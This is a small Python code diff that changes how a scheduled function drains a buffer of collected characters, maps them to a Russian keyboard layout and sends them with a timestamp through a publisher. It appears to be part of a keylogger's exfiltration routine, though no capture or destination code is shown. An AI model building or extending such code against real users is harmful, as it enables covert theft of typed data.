@@ -21,10 +21,10 @@ scheduler = BackgroundScheduler(job_defaults=job_defaults, timezone=timezone(TIM
 def send_collected_data():
     if time.time() - memory.last < DELAY or not memory.seq:
         return
+    payload = [memory.seq.pop(0) for _ in range(len(memory.seq))]
     collected_data = {
-        'en': ''.join(memory.seq),
-        'ru': ''.join(map(RU, memory.seq)),
+        'en': ''.join(payload),
+        'ru': ''.join(map(RU, payload)),
         'date': str(datetime.now(tz=timezone(TIMEZONE))),
     }
     publisher.send(collected_data)
-    memory.seq.clear()
